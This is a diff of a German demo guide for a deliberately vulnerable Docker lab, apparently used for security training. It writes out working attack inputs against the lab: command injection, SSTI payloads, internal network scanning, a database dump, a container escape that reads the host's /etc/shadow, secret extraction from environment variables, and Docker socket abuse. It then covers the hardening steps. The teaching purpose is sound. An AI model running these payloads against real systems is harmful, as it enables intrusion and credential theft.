@@ -1,379 +1,329 @@
-# Docker Container Security – Demo-Anleitung
+# Docker Container Security — Angriffs- und Härtungsanleitung
 
-## Ziel der Demo
+## Überblick
 
-Diese Demo zeigt typische Sicherheitsprobleme in Docker-Containern und wie man sie absichert.
-
-Demonstriert werden:
-
-1. Command Injection
-2. Lateral Movement zwischen Containern
-3. Container Escape
-4. Sicherheits-Härtung
+Diese Anleitung beschreibt Schritt für Schritt, wie die eingebauten Schwachstellen in der
+verwundbaren Docker-Umgebung ausgenutzt und anschließend durch die gehärtete Version verhindert
+werden.
 
 ---
 
-# Vorbereitung
+## Vorbereitung
 
-## Projekt starten
+### Projekt starten
 
 ```bash
-cd docker-security-demo
 docker compose up -d --build
 ```
 
-Danach etwa 30 Sekunden warten:
+Ca. 30–60 Sekunden warten (MySQL-Initialisierung), dann im Browser öffnen:
 
-```bash
-sleep 30
 ```
-
-Anschließend im Browser öffnen:
-
-```text
-http://localhost:5000
+http://localhost:5001
 ```
 
 ---
 
-# Schritt 1 – Command Injection
+## Schritt 1 — Command Injection
 
-## Ziel
+### Ziel
 
-Demonstrieren, dass unsichere Eingaben direkt im System ausgeführt werden können.
+Zeigen, dass unsanitisierte Nutzereingaben direkt als Shell-Befehl ausgeführt werden.
 
----
+### Normaler Test
 
-## Normaler Test
+Im Ping-Formular eingeben:
 
-Im Browser im Ping-Feld eingeben:
-
-```text
+```
 8.8.8.8
 ```
 
-Erwartung:
-- Normales Ping-Ergebnis
+Erwartetes Ergebnis: normales Ping-Ausgabe.
 
----
-
-## Command Injection ausführen
+### Angriff
 
 Eingabe:
 
-```text
+```
 8.8.8.8; whoami
 ```
 
-Erwartung:
-- Ausgabe zeigt:
+Erwartetes Ergebnis:
 
-```text
+```
 root
 ```
 
-Erklärung:
-- Der Benutzer hat Shell-Befehle eingeschleust
-- Die Anwendung läuft als Root im Container
+Der Angreifer führt beliebige Befehle als Root-Benutzer aus.
 
----
+### Erkundung des Systems
 
-## Betriebssystem auslesen
-
-Eingabe:
-
-```text
-8.8.8.8; cat /etc/os-release
 ```
-
-Erwartung:
-- Informationen zum Betriebssystem werden angezeigt
-
----
-
-## Prüfen ob Docker-Container
-
-Eingabe:
-
-```text
+8.8.8.8; id
+8.8.8.8; cat /etc/os-release
 8.8.8.8; cat /proc/1/cgroup
 ```
 
-Erwartung:
-- Hinweise auf Docker bzw. Containerisierung
-
-Erklärung:
-- Der Angreifer erkennt, dass er sich in einem Container befindet
+`/proc/1/cgroup` zeigt Einträge mit `docker` — bestätigt, dass wir uns im Container befinden.
 
 ---
 
-# Schritt 2 – Lateral Movement
+## Schritt 2 — Server-Side Template Injection (SSTI)
 
-## Ziel
+### Ziel
 
-Zeigen, wie ein kompromittierter Container andere Container im Netzwerk angreifen kann.
+Zeigen, dass Nutzereingaben, die direkt in ein serverseitiges Template eingebettet werden,
+zur Ausführung von Code auf dem Server führen können.
+
+### Angriff
+
+Im Browser aufrufen:
+
+```
+http://localhost:5001/report?title={{7*7}}
+```
+
+Erwartetes Ergebnis: Die Seite zeigt `49` statt des eingegebenen Textes.
+Jinja2 hat den Template-Ausdruck serverseitig ausgewertet.
+
+### Weiterführend
+
+```
+http://localhost:5001/report?title={{config}}
+```
+
+Zeigt die vollständige Flask-Konfiguration einschließlich des `SECRET_KEY`.
+
+```
+http://localhost:5001/report?title={{''.__class__.__mro__[1].__subclasses__()}}
+```
+
+Listet alle Python-Subklassen auf — Ausgangspunkt für vollständige Remote Code Execution.
 
 ---
 
-## Eigenes Netzwerk prüfen
+## Schritt 3 — Lateral Movement
 
-Eingabe:
+### Ziel
 
-```text
+Zeigen, wie ein kompromittierter Container andere Dienste im internen Netz angreift.
+
+### Netzwerk erkunden
+
+```
 8.8.8.8; cat /etc/hosts
 ```
 
-Erwartung:
-- Eigene IP-Adresse sichtbar
+Zeigt die eigene IP-Adresse des Containers.
 
----
+### Andere Container finden
 
-## Andere Container finden
-
-Eingabe:
-
-```bash
-;for i in 1 2 3 4 5 6 7 8 9 10; do ping -c 1 -W 1 172.18.0.$i 2>/dev/null && echo "HOST FOUND: 172.18.0.$i"; done
+```
+;for i in $(seq 1 15); do ping -c 1 -W 1 172.18.0.$i 2>/dev/null | grep "bytes from" && echo "HOST: 172.18.0.$i"; done
 ```
 
-Hinweis:
-- Die IP-Adressen können variieren
+Hinweis: IP-Adressen können variieren.
 
-Typische Zuordnung:
+### Admin-Service angreifen
 
-```text
-172.18.0.2 = db
-172.18.0.3 = admin
-172.18.0.4 = webapp
 ```
-
----
-
-## Admin-Service angreifen
-
-Eingabe:
-
-```bash
 ; curl -s http://admin:8080/api/config
 ```
 
-Erwartung:
-- API-Keys
-- Admin-Zugangsdaten
-- Konfigurationsdaten
+Erwartetes Ergebnis: AWS-Keys, Admin-Zugangsdaten, Datenbankkonfiguration.
 
-Erklärung:
-- Docker-DNS erlaubt die Kommunikation über Service-Namen
+Docker-DNS erlaubt die Auflösung des Service-Namens `admin` direkt.
 
----
+### Datenbank angreifen
 
-## Datenbank angreifen
-
-Eingabe:
-
-```bash
+```
 ; mysql -h db -u root -proot -e "SELECT * FROM kundenportal.kunden"
 ```
 
-Erwartung:
-- Kundendaten
-- Kreditkarteninformationen
-
-Erklärung:
-- Schwache Passwörter und fehlende Segmentierung ermöglichen Zugriff
+Erwartetes Ergebnis: Alle Kundendatensätze einschließlich Kreditkarteninformationen.
 
 ---
 
-# Schritt 3 – Container Escape
+## Schritt 4 — Container Escape (Privileged Mode)
 
-## Ziel
+### Ziel
 
-Zeigen, wie ein privilegierter Container Zugriff auf den Host erhalten kann.
+Zeigen, wie ein privilegierter Container auf das Host-Dateisystem zugreifen kann.
 
----
+### Privilegierten Modus erkennen
 
-## Prüfen ob privilegierter Container
-
-Eingabe:
-
-```bash
-; fdisk -l 2>/dev/null | head -5
+```
+; fdisk -l 2>/dev/null | head -10
 ```
 
-Erwartung:
-- Sichtbare Festplatten
+Wenn Festplatten angezeigt werden: Container ist privilegiert.
 
-Erklärung:
-- Der Container besitzt zu viele Rechte
+### Block-Devices anzeigen
 
----
-
-## Verfügbare Devices anzeigen
-
-Eingabe:
-
-```bash
+```
 ; lsblk
 ```
 
-Erwartung:
-- Liste aller Blockdevices
+Device-Namen können variieren: `sda1`, `vda1`, `xvda1`.
 
-Hinweis:
-- Device-Namen können variieren:
-  - sda1
-  - vda1
-  - xvda1
+### Host-Dateisystem einhängen
 
----
-
-## Host-Dateisystem mounten
-
-Eingabe:
-
-```bash
+```
 ; mkdir -p /mnt/host && mount /dev/sda1 /mnt/host 2>/dev/null; ls /mnt/host/
 ```
 
-Erwartung:
-- Zugriff auf Host-Dateien
+### Host-Dateien lesen
 
----
-
-## Dateien vom Host lesen
-
-Eingabe:
-
-```bash
+```
 ; cat /mnt/host/etc/hostname
+; cat /mnt/host/etc/shadow | head -5
 ```
 
-und:
-
-```bash
-; cat /mnt/host/etc/shadow | head -3
-```
-
-Erwartung:
-- Zugriff auf sensible Host-Daten
-
-Erklärung:
-- Vollständiger Ausbruch aus dem Container
-- Der Host ist kompromittiert
+Vollständiger Lesezugriff auf das Host-Dateisystem.
 
 ---
 
-# Sicherheits-Härtung demonstrieren
+## Schritt 5 — Secrets in Umgebungsvariablen
 
-## Verwundbare Umgebung stoppen
+### Ziel
+
+Zeigen, dass Passwörter und API-Keys in Umgebungsvariablen für jeden Prozess im Container
+lesbar sind.
+
+### Angriff aus dem Container
+
+```
+; cat /proc/1/environ | tr '\0' '\n'
+```
+
+Erwartetes Ergebnis:
+
+```
+DB_PASSWORD=root
+SECRET_API_KEY=sk-prod-a8f3b2c1d4e5f6a7b8c9d0e1f2a3b4c5
+JWT_SECRET=my-super-secret-jwt-signing-key-2024
+```
+
+### Angriff von außen (Docker-Host)
+
+```bash
+docker inspect $(docker compose ps -q webapp) | python3 -m json.tool | grep -A 10 '"Env"'
+```
+
+---
+
+## Schritt 6 — Secrets in Image-Layern
+
+### Ziel
+
+Zeigen, dass Zugangsdaten, die in `RUN`-Befehlen im Dockerfile vorkommen, dauerhaft in
+der Image-History gespeichert bleiben.
+
+### Image-History analysieren
+
+```bash
+docker history --no-trunc docker-container-security-webapp
+```
+
+Erwartetes Ergebnis: Ein `RUN`-Befehl mit dem Datenbankzugang im Klartext:
+
+```
+RUN echo "BACKUP_DB_URL=mysql://backup_user:Backup@2024!@db-prod.firma.local/kundenportal" ...
+```
+
+### Aus dem Container
+
+```
+; cat /etc/environment
+```
+
+---
+
+## Schritt 7 — Docker Socket Exposure
+
+### Ziel
+
+Zeigen, dass ein in den Container eingebundener Docker-Socket vollständige Kontrolle über
+den Docker-Daemon und damit über den Host ermöglicht.
+
+### Socket prüfen
+
+```
+; ls -la /var/run/docker.sock
+```
+
+### Laufende Container auflisten
+
+```
+; curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | python3 -m json.tool | head -40
+```
+
+### Privilegierten Container über die API erstellen
+
+```
+; curl -s --unix-socket /var/run/docker.sock \
+    -X POST \
+    -H "Content-Type: application/json" \
+    -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow | head -5"],"Binds":["/:/host"],"Privileged":true}' \
+    "http://localhost/containers/create?name=escape2"
+```
+
+Container starten:
+
+```
+; curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/escape2/start
+```
+
+Ausgabe lesen:
+
+```
+; sleep 2 && curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/escape2/logs?stdout=1"
+```
+
+Ergebnis: `/etc/shadow` des Hosts wird ausgegeben — vollständige Host-Übernahme ohne `--privileged`.
+
+---
+
+## Härtung demonstrieren
+
+### Verwundbare Version stoppen
 
 ```bash
 docker compose down
 ```
 
----
-
-## Gehärtete Version starten
+### Gehärtete Version starten
 
 ```bash
 docker compose -f docker-compose.hardened.yml up -d --build
-sleep 10
 ```
 
-Danach erneut öffnen:
+Dann im Browser öffnen: `http://localhost:5001` (grünes Design = gehärtet)
 
-```text
-http://localhost:5000
-```
-
-Hinweis:
-- Grünes Design = gehärtete Version
-
----
-
-# Schutzmaßnahmen testen
-
-## Command Injection erneut versuchen
+### Command Injection erneut versuchen
 
 Eingabe:
 
-```text
+```
 8.8.8.8; whoami
 ```
 
-Erwartung:
+Erwartetes Ergebnis: `Ungültige Eingabe!` — die Input-Validierung blockiert den Angriff.
 
-```text
-Ungültige Eingabe!
-```
-
-Erklärung:
-- Die Input-Validierung blockiert den Angriff
-
----
-
-## Container direkt betreten
+### Container betreten und Rechte prüfen
 
 ```bash
 docker compose -f docker-compose.hardened.yml exec webapp sh
 ```
 
-Folgende Tests durchführen:
-
-### Benutzer prüfen
-
 ```bash
-whoami
+whoami        # → appuser (nicht root)
+fdisk -l      # → Permission denied
+mount         # → Permission denied
+curl admin:8080  # → Network unreachable (Segmentierung)
 ```
 
-Erwartung:
-
-```text
-appuser
-```
-
-Nicht mehr:
-
-```text
-root
-```
-
----
-
-### Festplattenzugriff testen
-
-```bash
-fdisk -l
-```
-
-Erwartung:
-- Keine Berechtigung
-
----
-
-### Mount testen
-
-```bash
-mount
-```
-
-Erwartung:
-- Keine Berechtigung
-
----
-
-### Netzwerksegmentierung prüfen
-
-```bash
-curl admin:8080
-```
-
-Erwartung:
-- Netzwerk nicht erreichbar
-
----
-
-# Aufräumen
+### Aufräumen
 
 ```bash
 docker compose -f docker-compose.hardened.yml down
@@ -381,35 +331,32 @@ docker compose -f docker-compose.hardened.yml down
 
 ---
 
-# Zusammenfassung der Sicherheitsmaßnahmen
+## Zusammenfassung der Schwachstellen und Gegenmaßnahmen
 
-| Maßnahme | Wirkung |
-|---|---|
-| Input-Validierung | Verhindert Command Injection |
-| Non-Root User | Minimale Rechte im Container |
-| Kein `--privileged` | Kein Zugriff auf Host-Devices |
-| `cap_drop: ALL` | Entfernt Linux-Capabilities |
-| Netzwerksegmentierung | Verhindert Lateral Movement |
-| Starke Passwörter | Schutz der Datenbank |
-| Least Privilege | Minimierung des Schadens |
+| Schwachstelle | Ursache | Gegenmaßnahme |
+|---|---|---|
+| Command Injection | `shell=True`, keine Validierung | Regex-Whitelist, Argumente als Liste |
+| SSTI | Nutzereingabe als Template | Festes Template, Werte als Variablen |
+| Lateral Movement | Webapp in beiden Netzen | Netzwerksegmentierung, `internal: true` |
+| Container Escape | `privileged: true` | Flag weglassen, `cap_drop: ALL` |
+| Env-Var Secrets | Secrets als Umgebungsvariablen | Docker Secrets / externe Vaults |
+| Image-Layer Secrets | Credentials in `RUN`-Befehlen | Build-Argumente, mehrstufige Builds |
+| Docker Socket | Socket als Volume eingebunden | Socket nie exponieren |
+| Schwaches Passwort | `MYSQL_ROOT_PASSWORD: root` | Starkes Zufallspasswort |
+| Root im Container | Kein `USER`-Direktive | Non-Root-User im Dockerfile |
 
 ---
 
-# Kernaussage
+## Kernaussage
 
 Container sind keine vollständige Sicherheitsgrenze.
 
-Ohne Härtung können:
+Ohne gezielte Härtung können:
+- beliebige Befehle eingeschleust werden (Command Injection, SSTI)
+- andere Container und Dienste kompromittiert werden (Lateral Movement)
+- das Host-System übernommen werden (Privileged Escape, Docker Socket)
+- Zugangsdaten aus dem laufenden System oder aus Image-Layern extrahiert werden
 
-- Befehle eingeschleust werden
-- andere Container kompromittiert werden
-- Host-Systeme übernommen werden
-
-Sicherheit entsteht erst durch:
-
-- richtige Rechte
-- Netzwerksegmentierung
-- sichere Konfiguration
-- Input-Validierung
-- Least-Privilege-Prinzip
-
+Sicherheit in Container-Umgebungen entsteht durch das Zusammenspiel mehrerer Maßnahmen:
+Least-Privilege, Netzwerksegmentierung, sichere Konfiguration, Input-Validierung und
+sorgfältiges Secrets-Management.
